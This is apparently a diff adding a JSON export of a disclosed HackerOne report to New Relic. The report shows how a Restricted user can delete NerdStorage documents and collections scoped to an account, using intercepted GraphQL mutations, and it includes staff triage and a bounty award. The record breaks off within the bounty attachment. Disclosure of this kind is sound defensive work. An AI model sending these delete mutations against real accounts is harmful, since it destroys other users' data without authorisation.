@@ -1,0 +1,435 @@
+{
+  "id": 766145,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NjYxNDU=",
+  "url": "https://hackerone.com/reports/766145",
+  "title": "Restricted user can remove NerdStorage documents/collections scoped to ACCOUNT or ENTITY",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2019-12-30T17:42:27.258Z",
+  "submitted_at": "2019-12-30T17:42:27.258Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "skavans",
+    "url": "/skavans",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 17011,
+    "url": "https://hackerone.com/newrelic",
+    "handle": "newrelic",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "New Relic",
+      "twitter_handle": "newrelic",
+      "website": "https://newrelic.com",
+      "about": "New Relic's Coordinated Disclosure Program"
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-08-13T15:40:49.376Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-08-11T09:40:36.615Z",
+  "team_member_agreed_on_going_public_at": "2020-08-13T15:40:49.263Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hey team,\n\nI've found that the `Restricted` user can remove both documents and whole collections of NerdStorage documents which are scoped to ACCOUNT and ENTITY. I don't know if this is a vulnerability or not, but I think it would be better for you to discuss this internally. \n\nAccording to [docs](https://developer.newrelic.com/build-tools/new-relic-one-applications/nerdstorage), if a user is signed in the account (or can see the entity), he/she can read and write within the corresponding NerdStorage scopes:\n{F671723}\nBut, since the Restricted user is usually not allowed to perform destructive actions against the NR data, I think it is a subject for discussion at least. I think that there is a possible attack scenario when the full-fledged account users save some data inside some Nerdpack application (which uses the collections scoped to a whole ACCOUNT or many different ENTITies) and then the Restricted user can easily remove all the data saved by these users.\n\n##Steps to reproduce\n1) Sign in NR with `Admin` user\n2) Navigate to https://api.newrelic.com/graphiql, intercept the request to `nerd-graph.service.newrelic.com` with Burp Suite.\n3) Change the `Content-Type` value to `application/graphql`, change the body to the\n```graphql\nmutation {\n  m1: nerdStoreWriteDocument (\n    collection: \"test_account_collection\"\n    documentId: \"doc1\"\n    document: \"{\\\"data\\\": 1}\"\n    scope: {\n      id: \"2385914\"\n      name: ACCOUNTS\n    }\n  )\n  m2: nerdStoreWriteDocument (\n    collection: \"test_account_collection\"\n    documentId: \"doc2\"\n    document: \"{\\\"data\\\": 2}\"\n    scope: {\n      id: \"2385914\"\n      name: ACCOUNTS\n    }\n  )\n}\n```\nreplacing the `2385914` with your own account ID. Send the request. Thus, you saved some data scoped to your whole account into the NerdStorage.\n4) Sign in NR with `Restricted` user\n5) Navigate to https://api.newrelic.com/graphiql, intercept the request to `nerd-graph.service.newrelic.com` with Burp Suite.\n6) Change the `Content-Type` value to `application/graphql`, change the body to\n```graphql\nquery {\n  currentUser {\n    account (\n      id: 2385914\n    ) {\n      nerdStoreCollection (\n        collection: \"test_account_collection\"\n      ) {\n        document\n        id\n      }\n    }\n  }\n}\n```\nreplacing the `2385914` with your own account ID. Send the request and make sure there are 2 documents stored in collection `test_account_collection` scoped to a whole your account:\n{F671732}\n7) Change the request body to\n```graphql\nmutation {\n  nerdStorageDeleteDocument (\n    collection: \"test_account_collection\"\n    scope: {\n      id: \"2385914\"\n      name: ACCOUNT\n    }\n    documentId: \"doc1\"\n  ) {\n    deleted\n  }\n}\n```\nreplacing the `2385914` with your own account ID. Send the request.\n8) Execute the query from step 6 again. Make sure the document `doc1` saved by `Admin` user is removed:\n{F671733}\n9) Change the request body to\n```graphql\nmutation {\n  nerdStorageDeleteCollection (\n    collection: \"test_account_collection\"\n    scope: {\n      id: \"2385914\"\n      name: ACCOUNT\n    }\n  ) {\n    deleted\n  }\n}\n```\nreplacing the `2385914` with your own account ID. Send the request.\n10) Execute the query from step 6 again. Make sure the collection saved by `Admin` user was successfully removed by you (`Restricted` user):\n{F671734}\n\n##Remediation\nIn my opinion, you should either restrict the destructive GraphQL mutations for the Restricted user at all or allow him to only remove the NerdStorage entities which were created by himself. In the second case, the Restricted user will be able to create new collections or inject new documents inside existing collections and remove all of them, but he won't be able to remove the ones created/injected by full-fledged account users.\n\n## Impact\n\nThe `Restricted` user can remove NerdStore documents/collections created by full-fledged account users.",
+  "weakness": {
+    "id": 26,
+    "name": "Improper Access Control - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 671723,
+      "file_name": "______________2019-12-30___20.08.07.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/oipXdps1FFevQpyeDo3GaeX3?response-content-disposition=attachment%3B%20filename%3D%22______________2019-12-30___20.08.07.png%22%3B%20filename%2A%3DUTF-8%27%27______________2019-12-30___20.08.07.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWPXH7W2A%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072514Z&X-Amz-Expires=1014&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJGMEQCIHPD5gEySofUz1xOLbF9RxzsoYi23gDFF6VpbtbxOEbOAiB0gZ0PrWMj9ApM1upCkFsCGj2wZDr0sHM%2FdCN3TWiFlSqwBQgjEAMaDDAxMzYxOTI3NDg0OSIMFefSibaONAmXZdeqKo0FrStIIybrOK6bEwZr5pyK3JxTPHUorBb2V3hjVumlSUzrcUlJuskVWrmNd4RZL3xYp2NFjX6sZJlmfTosswJ6ixEgQRESjrdVab2HF45mm1trgD3HzrFdEa05QJxHMZHXuB0vxaGaUOTokNTEwFLItAjHN8%2FHLB9ycpatLFRq4uVN52spSmTZuDQndEo8CrKUsfA6BtwhxzLkkyZXne1e7M4CpAzxKNKcPiko1jpES02h%2Fmpk5SDR%2BRZgUwj065jAzDlJI%2FvKBvp8t7GbOQq5n5ZWH%2Bz25xRNvUE4i5RKXJizerdDmxAuRROSFAzpdj497%2Fu1CSvhiDHUA%2FVbn8aRwo5DUTNtQtdEeOAEEwiUDCqAgMd5lKuIYIFEIDBuOZNAgvte6VgIXN37ZrqXGK1lsZDS2Hv2bBBHglR9kA4uWBUlZddQ0fUlTAThnBO%2FkixEijGrsWLkkqt8dXMp%2FKYzi2wtDguJlqkw8pnHiViufOnyhy3mr5aLppahgdAOgCchFtV7W9lAV4PB4O0o4p2B9tFko0Jtrln3CsOFrrIzCFf%2BqS2LdxwMZ1jZR3buat3bHV7T5DKtUBs4MGMx6kIi%2FI8gpiY69A3lVRFCjHfWE12sqHEdq9rnG07syd1vglEXDaqqJe%2BYfYR5Ee8nKmckWCkLt0pEGiIA%2FRI%2Bs0ch6NccoW1IiW1uRJG2o64XI%2Bhv3%2Ff2Jg1XfOr%2FKnljk3KQypfib6Zo3eySEuL4cPDCbFIQ%2B4fpUtNBwB%2B6TbMKThow0d%2B9zURqcAZ6QSoDbaT9p04JVxFeOyWzLmH5zvIIt52C%2FVUHGoRrO3ELP6qYs0snGQH6%2FmKbyjnqEMAatXzXI2U9K25Q6ELBK1NGPV0wwYC5qAY6sgHvPFSU40Te8U3TvG0%2FxnZKpqRY7RwHe0EqI8E%2Ffn%2FbAzZtS1msTHhvGiqBntJ%2BccpQwaI%2F7uuwU5ZbJ0JKOVnnBIFFbA%2F2LUwsTSOccxF6VQyLkJQfo0TACBsb8BuejEQN1JySWmkU0BakfQo05LRh87A3TuiIhaxJJzE6m%2B%2BClcIezMNMH9ULosA4UY1PvvIIQAIFyFjboubORtGvP383QMi6o8GCABrtvUKoxEMaCYgZ&X-Amz-SignedHeaders=host&X-Amz-Signature=9f780c25c6203a60ca6435a9acd9426b121a6a49db74e914f69028c6f0b58816",
+      "file_size": 78638,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 671732,
+      "file_name": "______________2019-12-30___20.30.24.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/8Lr2U8MzCGhSN8nTFbHtkWVB?response-content-disposition=attachment%3B%20filename%3D%22______________2019-12-30___20.30.24.png%22%3B%20filename%2A%3DUTF-8%27%27______________2019-12-30___20.30.24.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWPXH7W2A%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072514Z&X-Amz-Expires=1014&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJGMEQCIHPD5gEySofUz1xOLbF9RxzsoYi23gDFF6VpbtbxOEbOAiB0gZ0PrWMj9ApM1upCkFsCGj2wZDr0sHM%2FdCN3TWiFlSqwBQgjEAMaDDAxMzYxOTI3NDg0OSIMFefSibaONAmXZdeqKo0FrStIIybrOK6bEwZr5pyK3JxTPHUorBb2V3hjVumlSUzrcUlJuskVWrmNd4RZL3xYp2NFjX6sZJlmfTosswJ6ixEgQRESjrdVab2HF45mm1trgD3HzrFdEa05QJxHMZHXuB0vxaGaUOTokNTEwFLItAjHN8%2FHLB9ycpatLFRq4uVN52spSmTZuDQndEo8CrKUsfA6BtwhxzLkkyZXne1e7M4CpAzxKNKcPiko1jpES02h%2Fmpk5SDR%2BRZgUwj065jAzDlJI%2FvKBvp8t7GbOQq5n5ZWH%2Bz25xRNvUE4i5RKXJizerdDmxAuRROSFAzpdj497%2Fu1CSvhiDHUA%2FVbn8aRwo5DUTNtQtdEeOAEEwiUDCqAgMd5lKuIYIFEIDBuOZNAgvte6VgIXN37ZrqXGK1lsZDS2Hv2bBBHglR9kA4uWBUlZddQ0fUlTAThnBO%2FkixEijGrsWLkkqt8dXMp%2FKYzi2wtDguJlqkw8pnHiViufOnyhy3mr5aLppahgdAOgCchFtV7W9lAV4PB4O0o4p2B9tFko0Jtrln3CsOFrrIzCFf%2BqS2LdxwMZ1jZR3buat3bHV7T5DKtUBs4MGMx6kIi%2FI8gpiY69A3lVRFCjHfWE12sqHEdq9rnG07syd1vglEXDaqqJe%2BYfYR5Ee8nKmckWCkLt0pEGiIA%2FRI%2Bs0ch6NccoW1IiW1uRJG2o64XI%2Bhv3%2Ff2Jg1XfOr%2FKnljk3KQypfib6Zo3eySEuL4cPDCbFIQ%2B4fpUtNBwB%2B6TbMKThow0d%2B9zURqcAZ6QSoDbaT9p04JVxFeOyWzLmH5zvIIt52C%2FVUHGoRrO3ELP6qYs0snGQH6%2FmKbyjnqEMAatXzXI2U9K25Q6ELBK1NGPV0wwYC5qAY6sgHvPFSU40Te8U3TvG0%2FxnZKpqRY7RwHe0EqI8E%2Ffn%2FbAzZtS1msTHhvGiqBntJ%2BccpQwaI%2F7uuwU5ZbJ0JKOVnnBIFFbA%2F2LUwsTSOccxF6VQyLkJQfo0TACBsb8BuejEQN1JySWmkU0BakfQo05LRh87A3TuiIhaxJJzE6m%2B%2BClcIezMNMH9ULosA4UY1PvvIIQAIFyFjboubORtGvP383QMi6o8GCABrtvUKoxEMaCYgZ&X-Amz-SignedHeaders=host&X-Amz-Signature=3a6387082b3ae3a6dea8fd2c1b06d098ab6cf0a519a1a634fee8e8f71ceacf94",
+      "file_size": 93320,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 671733,
+      "file_name": "______________2019-12-30___20.33.12.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/eKB4P8s14jmJVpJFzAJRWjhU?response-content-disposition=attachment%3B%20filename%3D%22______________2019-12-30___20.33.12.png%22%3B%20filename%2A%3DUTF-8%27%27______________2019-12-30___20.33.12.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWPXH7W2A%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072514Z&X-Amz-Expires=1014&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJGMEQCIHPD5gEySofUz1xOLbF9RxzsoYi23gDFF6VpbtbxOEbOAiB0gZ0PrWMj9ApM1upCkFsCGj2wZDr0sHM%2FdCN3TWiFlSqwBQgjEAMaDDAxMzYxOTI3NDg0OSIMFefSibaONAmXZdeqKo0FrStIIybrOK6bEwZr5pyK3JxTPHUorBb2V3hjVumlSUzrcUlJuskVWrmNd4RZL3xYp2NFjX6sZJlmfTosswJ6ixEgQRESjrdVab2HF45mm1trgD3HzrFdEa05QJxHMZHXuB0vxaGaUOTokNTEwFLItAjHN8%2FHLB9ycpatLFRq4uVN52spSmTZuDQndEo8CrKUsfA6BtwhxzLkkyZXne1e7M4CpAzxKNKcPiko1jpES02h%2Fmpk5SDR%2BRZgUwj065jAzDlJI%2FvKBvp8t7GbOQq5n5ZWH%2Bz25xRNvUE4i5RKXJizerdDmxAuRROSFAzpdj497%2Fu1CSvhiDHUA%2FVbn8aRwo5DUTNtQtdEeOAEEwiUDCqAgMd5lKuIYIFEIDBuOZNAgvte6VgIXN37ZrqXGK1lsZDS2Hv2bBBHglR9kA4uWBUlZddQ0fUlTAThnBO%2FkixEijGrsWLkkqt8dXMp%2FKYzi2wtDguJlqkw8pnHiViufOnyhy3mr5aLppahgdAOgCchFtV7W9lAV4PB4O0o4p2B9tFko0Jtrln3CsOFrrIzCFf%2BqS2LdxwMZ1jZR3buat3bHV7T5DKtUBs4MGMx6kIi%2FI8gpiY69A3lVRFCjHfWE12sqHEdq9rnG07syd1vglEXDaqqJe%2BYfYR5Ee8nKmckWCkLt0pEGiIA%2FRI%2Bs0ch6NccoW1IiW1uRJG2o64XI%2Bhv3%2Ff2Jg1XfOr%2FKnljk3KQypfib6Zo3eySEuL4cPDCbFIQ%2B4fpUtNBwB%2B6TbMKThow0d%2B9zURqcAZ6QSoDbaT9p04JVxFeOyWzLmH5zvIIt52C%2FVUHGoRrO3ELP6qYs0snGQH6%2FmKbyjnqEMAatXzXI2U9K25Q6ELBK1NGPV0wwYC5qAY6sgHvPFSU40Te8U3TvG0%2FxnZKpqRY7RwHe0EqI8E%2Ffn%2FbAzZtS1msTHhvGiqBntJ%2BccpQwaI%2F7uuwU5ZbJ0JKOVnnBIFFbA%2F2LUwsTSOccxF6VQyLkJQfo0TACBsb8BuejEQN1JySWmkU0BakfQo05LRh87A3TuiIhaxJJzE6m%2B%2BClcIezMNMH9ULosA4UY1PvvIIQAIFyFjboubORtGvP383QMi6o8GCABrtvUKoxEMaCYgZ&X-Amz-SignedHeaders=host&X-Amz-Signature=39a32d9c56b2d70c704c09f42cae83b42e125c4fcaafb015816b7e25f3b99055",
+      "file_size": 73716,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 671734,
+      "file_name": "______________2019-12-30___20.35.29.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/3XcM8qsJfwBEQ7Wwcp8EC2F2?response-content-disposition=attachment%3B%20filename%3D%22______________2019-12-30___20.35.29.png%22%3B%20filename%2A%3DUTF-8%27%27______________2019-12-30___20.35.29.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWPXH7W2A%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072514Z&X-Amz-Expires=1014&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJGMEQCIHPD5gEySofUz1xOLbF9RxzsoYi23gDFF6VpbtbxOEbOAiB0gZ0PrWMj9ApM1upCkFsCGj2wZDr0sHM%2FdCN3TWiFlSqwBQgjEAMaDDAxMzYxOTI3NDg0OSIMFefSibaONAmXZdeqKo0FrStIIybrOK6bEwZr5pyK3JxTPHUorBb2V3hjVumlSUzrcUlJuskVWrmNd4RZL3xYp2NFjX6sZJlmfTosswJ6ixEgQRESjrdVab2HF45mm1trgD3HzrFdEa05QJxHMZHXuB0vxaGaUOTokNTEwFLItAjHN8%2FHLB9ycpatLFRq4uVN52spSmTZuDQndEo8CrKUsfA6BtwhxzLkkyZXne1e7M4CpAzxKNKcPiko1jpES02h%2Fmpk5SDR%2BRZgUwj065jAzDlJI%2FvKBvp8t7GbOQq5n5ZWH%2Bz25xRNvUE4i5RKXJizerdDmxAuRROSFAzpdj497%2Fu1CSvhiDHUA%2FVbn8aRwo5DUTNtQtdEeOAEEwiUDCqAgMd5lKuIYIFEIDBuOZNAgvte6VgIXN37ZrqXGK1lsZDS2Hv2bBBHglR9kA4uWBUlZddQ0fUlTAThnBO%2FkixEijGrsWLkkqt8dXMp%2FKYzi2wtDguJlqkw8pnHiViufOnyhy3mr5aLppahgdAOgCchFtV7W9lAV4PB4O0o4p2B9tFko0Jtrln3CsOFrrIzCFf%2BqS2LdxwMZ1jZR3buat3bHV7T5DKtUBs4MGMx6kIi%2FI8gpiY69A3lVRFCjHfWE12sqHEdq9rnG07syd1vglEXDaqqJe%2BYfYR5Ee8nKmckWCkLt0pEGiIA%2FRI%2Bs0ch6NccoW1IiW1uRJG2o64XI%2Bhv3%2Ff2Jg1XfOr%2FKnljk3KQypfib6Zo3eySEuL4cPDCbFIQ%2B4fpUtNBwB%2B6TbMKThow0d%2B9zURqcAZ6QSoDbaT9p04JVxFeOyWzLmH5zvIIt52C%2FVUHGoRrO3ELP6qYs0snGQH6%2FmKbyjnqEMAatXzXI2U9K25Q6ELBK1NGPV0wwYC5qAY6sgHvPFSU40Te8U3TvG0%2FxnZKpqRY7RwHe0EqI8E%2Ffn%2FbAzZtS1msTHhvGiqBntJ%2BccpQwaI%2F7uuwU5ZbJ0JKOVnnBIFFbA%2F2LUwsTSOccxF6VQyLkJQfo0TACBsb8BuejEQN1JySWmkU0BakfQo05LRh87A3TuiIhaxJJzE6m%2B%2BClcIezMNMH9ULosA4UY1PvvIIQAIFyFjboubORtGvP383QMi6o8GCABrtvUKoxEMaCYgZ&X-Amz-SignedHeaders=host&X-Amz-Signature=e9305728d4ce73c1d53c9999cc046f0b997c99654870c9393c9918818a497c54",
+      "file_size": 53908,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-09-10T09:40:36.662Z",
+  "allow_singular_disclosure_after": -95723077.90638436,
+  "singular_disclosure_allowed": true,
+  "vote_count": 2,
+  "voters": [
+    "wi11",
+    "ali"
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 4405,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.newrelic.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 6661847,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @skavans, I _believe_ that NerdStore modifications were intended to be possible for all users, but I agree that this does seem out-of-line with what a Restricted Users should be expected to be able to do.\n\nThis is a great topic for discussion, so I'll ask the architect in charge of this platform, and I'll let you know!",
+      "automated_response": false,
+      "created_at": "2019-12-30T21:33:11.439Z",
+      "updated_at": "2019-12-30T21:33:11.439Z",
+      "actor": {
+        "username": "ahamlin",
+        "cleared": false,
+        "verified": false,
+        "url": "/ahamlin",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/037/071/b10c1e5872fac616ba0f3b67bb1e6e06ba70fe6c_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 6661849,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "The architect is out on vacation this week, so this may take some time before I can get an answer!",
+      "automated_response": false,
+      "created_at": "2019-12-30T21:34:41.769Z",
+      "updated_at": "2019-12-30T21:34:41.769Z",
+      "actor": {
+        "username": "ahamlin",
+        "cleared": false,
+        "verified": false,
+        "url": "/ahamlin",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/037/071/b10c1e5872fac616ba0f3b67bb1e6e06ba70fe6c_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 6721658,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hey @skavans,\n\nI've confirmed that a Restricted User should not be able to modify Nerd Store documents or collections scoped to accounts/entities. However, when attempting to reproduce this report, it appears that modifying the Content-Type to `application/graphql` no longer works—I'm seeing an \"Invalid JSON\" error when I attempt to do so. This also appears to be true for the steps in report #765565.\n\nI'm out of time to reproduce today, but tomorrow I can attempt to encode the payloads as JSON tomorrow and try again. Sorry for the delay on this one!",
+      "automated_response": false,
+      "created_at": "2020-01-08T22:54:07.280Z",
+      "updated_at": "2020-01-08T22:54:07.280Z",
+      "actor": {
+        "username": "ahamlin",
+        "cleared": false,
+        "verified": false,
+        "url": "/ahamlin",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/037/071/b10c1e5872fac616ba0f3b67bb1e6e06ba70fe6c_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 6735895,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hey @ahamlin,\n\nChanging the content-type to `application/graphql` is still working for me.\n{F680610}",
+      "automated_response": false,
+      "created_at": "2020-01-10T13:02:20.988Z",
+      "updated_at": "2020-01-10T13:02:20.988Z",
+      "actor": {
+        "username": "skavans",
+        "cleared": false,
+        "verified": false,
+        "url": "/skavans",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 680610,
+          "filename": "______________2020-01-10___16.01.57.png",
+          "type": "image/png",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/UrYTFQ7edWHjcVHAS6fp1wY7?response-content-disposition=attachment%3B%20filename%3D%22______________2020-01-10___16.01.57.png%22%3B%20filename%2A%3DUTF-8%27%27______________2020-01-10___16.01.57.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWPXH7W2A%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072514Z&X-Amz-Expires=1014&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJGMEQCIHPD5gEySofUz1xOLbF9RxzsoYi23gDFF6VpbtbxOEbOAiB0gZ0PrWMj9ApM1upCkFsCGj2wZDr0sHM%2FdCN3TWiFlSqwBQgjEAMaDDAxMzYxOTI3NDg0OSIMFefSibaONAmXZdeqKo0FrStIIybrOK6bEwZr5pyK3JxTPHUorBb2V3hjVumlSUzrcUlJuskVWrmNd4RZL3xYp2NFjX6sZJlmfTosswJ6ixEgQRESjrdVab2HF45mm1trgD3HzrFdEa05QJxHMZHXuB0vxaGaUOTokNTEwFLItAjHN8%2FHLB9ycpatLFRq4uVN52spSmTZuDQndEo8CrKUsfA6BtwhxzLkkyZXne1e7M4CpAzxKNKcPiko1jpES02h%2Fmpk5SDR%2BRZgUwj065jAzDlJI%2FvKBvp8t7GbOQq5n5ZWH%2Bz25xRNvUE4i5RKXJizerdDmxAuRROSFAzpdj497%2Fu1CSvhiDHUA%2FVbn8aRwo5DUTNtQtdEeOAEEwiUDCqAgMd5lKuIYIFEIDBuOZNAgvte6VgIXN37ZrqXGK1lsZDS2Hv2bBBHglR9kA4uWBUlZddQ0fUlTAThnBO%2FkixEijGrsWLkkqt8dXMp%2FKYzi2wtDguJlqkw8pnHiViufOnyhy3mr5aLppahgdAOgCchFtV7W9lAV4PB4O0o4p2B9tFko0Jtrln3CsOFrrIzCFf%2BqS2LdxwMZ1jZR3buat3bHV7T5DKtUBs4MGMx6kIi%2FI8gpiY69A3lVRFCjHfWE12sqHEdq9rnG07syd1vglEXDaqqJe%2BYfYR5Ee8nKmckWCkLt0pEGiIA%2FRI%2Bs0ch6NccoW1IiW1uRJG2o64XI%2Bhv3%2Ff2Jg1XfOr%2FKnljk3KQypfib6Zo3eySEuL4cPDCbFIQ%2B4fpUtNBwB%2B6TbMKThow0d%2B9zURqcAZ6QSoDbaT9p04JVxFeOyWzLmH5zvIIt52C%2FVUHGoRrO3ELP6qYs0snGQH6%2FmKbyjnqEMAatXzXI2U9K25Q6ELBK1NGPV0wwYC5qAY6sgHvPFSU40Te8U3TvG0%2FxnZKpqRY7RwHe0EqI8E%2Ffn%2FbAzZtS1msTHhvGiqBntJ%2BccpQwaI%2F7uuwU5ZbJ0JKOVnnBIFFbA%2F2LUwsTSOccxF6VQyLkJQfo0TACBsb8BuejEQN1JySWmkU0BakfQo05LRh87A3TuiIhaxJJzE6m%2B%2BClcIezMNMH9ULosA4UY1PvvIIQAIFyFjboubORtGvP383QMi6o8GCABrtvUKoxEMaCYgZ&X-Amz-SignedHeaders=host&X-Amz-Signature=a19e13ef637273f977159c6f5a5fd591a14356fbb96ec3b1eeb761051773eb44"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 6759929,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "Thanks for confirming that, @skavans! I realized my mistake, and was able to reproduce.\n\nThis is a good find! It seems like we haven't always been careful when stitching backend services into our GraphQL schema. We appreciate you pointing this out to us!",
+      "automated_response": false,
+      "created_at": "2020-01-13T19:36:36.036Z",
+      "updated_at": "2020-01-13T19:36:36.036Z",
+      "actor": {
+        "username": "ahamlin",
+        "cleared": false,
+        "verified": false,
+        "url": "/ahamlin",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/037/071/b10c1e5872fac616ba0f3b67bb1e6e06ba70fe6c_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 6759938,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "{F683564}",
+      "automated_response": false,
+      "created_at": "2020-01-13T19:37:06.527Z",
+      "updated_at": "2020-01-13T19:37:06.527Z",
+      "actor": {
+        "url": "/newrelic",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "New Relic"
+        }
+      },
+      "bounty_currency": "usd",
+      "attachments": [
+        {
+          "id": 683564,
+          "filename": "_37.gif",
+          "type": "image/gif",
